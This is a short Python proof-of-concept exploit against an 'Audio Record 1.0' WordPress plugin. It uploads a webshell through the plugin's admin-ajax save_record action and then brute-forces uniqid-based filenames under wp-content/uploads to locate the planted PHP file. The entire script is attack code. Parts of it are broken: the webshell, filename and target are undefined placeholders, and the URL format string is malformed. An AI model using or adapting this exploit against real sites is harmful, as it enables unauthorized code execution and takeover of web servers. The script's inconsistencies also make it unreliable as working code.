import sys
import requests
import time
import math
import binascii
from uniqid import uniqid

def exploit(host):
    """ Audio Record 1.0 Exploit PoC 
    
    Input: Target Host URL
    Output: URL of Uploaded File
    """

    target_page = "{}/wp-admin/admin-ajax.php".format(host)

    files = {
        "audio-blob": (
            "blob",
            WEBSHELL
        )
    }

    data = {
        "audio-filename":FILENAME,
        "action":"save_record",
        "course_id":"undefined",
        "unit_id":"undefined"
    }
    
    s = requests.Session()
    first_uniqid = uniqid()
    req = s.post(target_page, data=data, files=files)
    second_uniqid = uniqid()
    diff = (int(second_uniqid,16) - int(first_uniqid,16)) * 10
    first_uniqid_int = int(first_uniqid,16)
    content = req.content.decode("ascii")
    
    if content == "1":
        for i in range(first_uniqid_int, first_uniqid_int+diff):
            target_url = "{}/wp-content/uploads/{YEAR}/{MONTH}/{:x}_{}".format(host,int(i),filename)
            req = s.get(target_url)
            if req.status_code == requests.codes.ok:
                print("Target URL: " + target_url)
                return "Found"
                break
        print("[-] Cannot find PHP file")
    else:
        print("[-] Error while processing requests.")

if __name__ == "__main__":
    try:
        exploit(TARGET_HOST)
    except:
        print("[-] Unexpected error while exploiting...")
        print("    Error: {}".format(sys.exc_info()[0]))
        print("Usage: exploit.py [host]")